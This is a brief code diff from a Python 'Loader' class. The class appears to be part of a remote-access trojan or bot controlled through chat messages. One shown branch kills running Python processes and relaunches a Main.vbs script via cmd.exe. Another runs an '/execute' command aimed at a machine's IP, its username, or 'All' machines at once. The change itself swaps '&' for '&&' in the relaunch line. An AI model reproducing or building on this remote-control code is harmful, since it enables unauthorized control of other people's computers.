@@ -83,7 +83,7 @@ class Loader():
 						filename = os.path.abspath(__file__).split("\\")
 						filename.pop()
 						filename = "\\".join(filename) + "\\Main.vbs"
-						os.system("cmd.exe /c taskkill /F /IM python.exe & " + filename)
+						os.system("cmd.exe /c taskkill /F /IM python.exe && " + filename)
 					elif command == "/execute" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						spl = message['text'].split(" ")
 						spl.remove(spl[0])
